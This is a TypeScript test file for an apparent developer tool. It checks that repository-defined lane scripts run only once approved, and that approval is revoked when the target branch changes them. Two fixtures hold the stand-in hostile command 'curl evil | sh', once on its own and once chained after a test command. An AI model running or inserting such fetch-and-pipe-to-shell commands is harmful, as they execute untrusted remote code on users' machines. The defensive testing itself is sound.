import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { LocalExecutionContext } from '@main/core/execution-context/local-execution-context';
import { GIT_EXECUTABLE } from '@main/core/utils/exec';
import { recordLaneApproval } from '@main/core/workspaces/script-approval';
import { db } from '@main/db/client';
import { repoSettings } from '@main/db/schema-repo-settings';
import { repos, workItems, workItemWorktrees } from '@main/db/schema-work-items';
import { removeDirSync } from '@main/lib/remove-dir-sync';
import { resolveLaneBundle } from './lane-bundle';
import { resolveApprovedLaneScripts } from './lane-config';

vi.mock('@main/db/client', async () => {
  const { createMigratedTestDb } = await import('@main/db/_testing/migrated-test-db');
  return { db: createMigratedTestDb() };
});

async function git(args: string[], cwd: string): Promise<string> {
  const { stdout } = await new LocalExecutionContext({ root: cwd }).exec(GIT_EXECUTABLE, args);
  return stdout.trim();
}

const LANE = 'lane-1';

/**
 * What a lane's terminals and teardown may run, read when they run: approval
 * given after the workspace was acquired (at setup, or at agent start)
 * applies straight away, and a change on the target ref stops it again.
 */
describe('resolveApprovedLaneScripts', () => {
  let root: string;
  let repoDir: string;

  async function commitConfig(config: object): Promise<void> {
    fs.writeFileSync(path.join(repoDir, '.chord.json'), JSON.stringify(config));
    await git(['add', '.chord.json'], repoDir);
    await git(['commit', '-m', 'config'], repoDir);
  }

  beforeEach(async () => {
    root = fs.mkdtempSync(path.join(os.tmpdir(), 'lane-config-'));
    repoDir = path.join(root, 'repo');
    fs.mkdirSync(repoDir);
    await git(['init'], repoDir);
    await git(['symbolic-ref', 'HEAD', 'refs/heads/main'], repoDir);
    await git(['config', 'user.email', 'test@test.com'], repoDir);
    await git(['config', 'user.name', 'Test'], repoDir);
    await commitConfig({
      shellSetup: 'source .envrc',
      scripts: { run: 'pnpm dev', teardown: 'make down' },
    });
    const lanePath = path.join(root, 'pool', 'lane');
    await git(['worktree', 'add', '-b', 'chord/lane', lanePath, 'main'], repoDir);
    db.insert(repos).values({ id: 'repo-1', path: repoDir, alias: 'repo' }).run();
    db.insert(workItems)
      .values({
        id: 'item-1',
        name: 'item',
        repoId: 'repo-1',
        repoPath: repoDir,
        provisionStatus: 'ready',
      })
      .run();
    db.insert(workItemWorktrees)
      .values({
        id: LANE,
        workItemId: 'item-1',
        path: lanePath,
        isPrimary: 1,
        targetRef: 'main',
        setupStatus: 'ok',
      })
      .run();
  });

  afterEach(() => {
    db.delete(workItems).run();
    db.delete(repos).run();
    removeDirSync(root);
  });

  it('gives nothing to run until the lane is approved', async () => {
    await expect(resolveApprovedLaneScripts(LANE)).resolves.toEqual({ run: {} });
  });

  it('gives the scripts as soon as they are approved, without re-acquiring anything', async () => {
    const { bundle } = await resolveLaneBundle(LANE);
    recordLaneApproval(LANE, bundle!);

    await expect(resolveApprovedLaneScripts(LANE)).resolves.toEqual({
      shellSetup: 'source .envrc',
      run: { default: 'pnpm dev' },
      teardown: 'make down',
    });
  });

  it('stops giving them when the target ref changes what would run', async () => {
    const { bundle } = await resolveLaneBundle(LANE);
    recordLaneApproval(LANE, bundle!);
    await commitConfig({ shellSetup: 'curl evil | sh', scripts: { teardown: 'make down' } });

    await expect(resolveApprovedLaneScripts(LANE)).resolves.toEqual({ run: {} });
  });

  it("gives the user's own scripts without approval, and the team's only once approved", async () => {
    db.insert(repoSettings)
      .values({
        repoId: 'repo-1',
        overrides: JSON.stringify({ scripts: { teardown: 'docker compose down' } }),
      })
      .run();

    await expect(resolveApprovedLaneScripts(LANE)).resolves.toEqual({
      run: {},
      teardown: 'docker compose down',
    });

    const { bundle } = await resolveLaneBundle(LANE);
    recordLaneApproval(LANE, bundle!);
    await expect(resolveApprovedLaneScripts(LANE)).resolves.toEqual({
      shellSetup: 'source .envrc',
      run: { default: 'pnpm dev' },
      teardown: 'docker compose down',
    });
  });

  it('gives nothing, without throwing, for an invalid .chord.json — setup reports that', async () => {
    fs.writeFileSync(path.join(repoDir, '.chord.json'), '{ "scripts": ');
    await git(['commit', '-am', 'broken'], repoDir);

    await expect(resolveApprovedLaneScripts(LANE)).resolves.toEqual({ run: {} });
  });

  // Phase 4 (devstation-5b3.1): named run scripts and the test script.
  describe('run and test', () => {
    function setOverrides(overrides: object): void {
      db.insert(repoSettings)
        .values({ repoId: 'repo-1', overrides: JSON.stringify(overrides) })
        .run();
    }

    async function approveLane(): Promise<void> {
      const { bundle } = await resolveLaneBundle(LANE);
      recordLaneApproval(LANE, bundle!);
    }

    it("gives the team's named run scripts and test script once approved", async () => {
      await commitConfig({
        scripts: { run: { web: 'pnpm web', api: 'pnpm api' }, test: 'pnpm t' },
      });
      await expect(resolveApprovedLaneScripts(LANE)).resolves.toEqual({ run: {} });

      await approveLane();
      await expect(resolveApprovedLaneScripts(LANE)).resolves.toEqual({
        run: { web: 'pnpm web', api: 'pnpm api' },
        test: 'pnpm t',
      });
    });

    it("gives the user's own run and test without approval", async () => {
      setOverrides({ scripts: { run: { web: 'make web' }, test: 'make test' } });

      await expect(resolveApprovedLaneScripts(LANE)).resolves.toEqual({
        run: { web: 'make web' },
        test: 'make test',
      });
    });

    it("lets the user's own run replace the team's approved run scripts entirely", async () => {
      await commitConfig({
        scripts: { run: { web: 'pnpm web', api: 'pnpm api' }, test: 'pnpm t' },
      });
      setOverrides({ scripts: { run: 'make dev' } });
      await approveLane();

      await expect(resolveApprovedLaneScripts(LANE)).resolves.toEqual({
        run: { default: 'make dev' },
        test: 'pnpm t',
      });
    });

    it('stops giving the test script when the target ref changes it', async () => {
      await commitConfig({ scripts: { test: 'pnpm t' } });
      await approveLane();
      await commitConfig({ scripts: { test: 'pnpm t && curl evil | sh' } });

      await expect(resolveApprovedLaneScripts(LANE)).resolves.toEqual({ run: {} });
    });
  });
});
